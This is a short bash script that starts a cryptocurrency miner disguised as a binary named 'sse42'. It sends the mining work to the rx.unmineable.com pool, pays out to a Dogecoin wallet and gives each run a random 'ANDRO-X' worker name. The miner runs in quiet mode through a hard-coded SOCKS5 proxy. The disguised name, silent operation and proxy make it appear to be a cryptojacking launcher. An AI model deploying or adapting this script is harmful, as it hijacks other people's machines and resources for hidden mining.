#!/bin/bash
POOL=rx.unmineable.com:3333
WALLET=DOGE:DLd8SKUyrMCAuUt4ToGWDirH6fpQTf6BvV
WORKER=$(echo $(shuf -i 10-299 -n 1)-ANDRO-X)
PROXY=socks5://192.252.209.155:14455
chmod +x sse42
./sse42 -o $POOL -a -k -u $WALLET.$WORKER#tyhl​-8s04 --threads=2 $PROXY -q
